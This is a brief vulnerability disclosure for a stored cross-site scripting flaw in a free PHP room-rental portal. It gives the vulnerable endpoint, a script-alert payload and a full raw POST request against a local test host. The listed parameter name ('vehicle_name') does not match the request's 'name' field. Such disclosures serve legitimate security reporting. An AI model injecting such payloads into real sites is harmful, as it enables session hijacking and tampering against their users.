# room-rent-portal-site - Cross-site Scripting (XSS)

vendors: https://www.sourcecodester.com/php/15301/room-rent-portal-site-phpoop-free-source-code.html

Date: 2022-05-07

Vulnerability File: /rrps/classes/Master.php?f=save_category

Vulnerability location: /rrps/classes/Master.php?f=save_category, vehicle_name

[+] Payload: <sCrIpT>alert(1)</sCrIpT>

Tested on Windows 10, XAMPP

```
POST http://192.168.2.106/rrps/classes/Master.php?f=save_category HTTP/1.1
Host: 192.168.2.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------39324278941716868132909560787
Content-Length: 416
Origin: http://192.168.2.106
Connection: keep-alive
Referer: http://192.168.2.106/rrps/admin/?page=categories
Cookie: PHPSESSID=h4hpbcj74nsiroalrkj8o2251s

-----------------------------39324278941716868132909560787
Content-Disposition: form-data; name="id"

2
-----------------------------39324278941716868132909560787
Content-Disposition: form-data; name="name"

<ScRiPt>alert(1)</ScRiPt>
-----------------------------39324278941716868132909560787
Content-Disposition: form-data; name="status"

1
-----------------------------39324278941716868132909560787--

```

![](https://github.com/mikeccltt/bug_report_CVE/blob/main/room-rent-portal-site/xss.gif?raw=true)
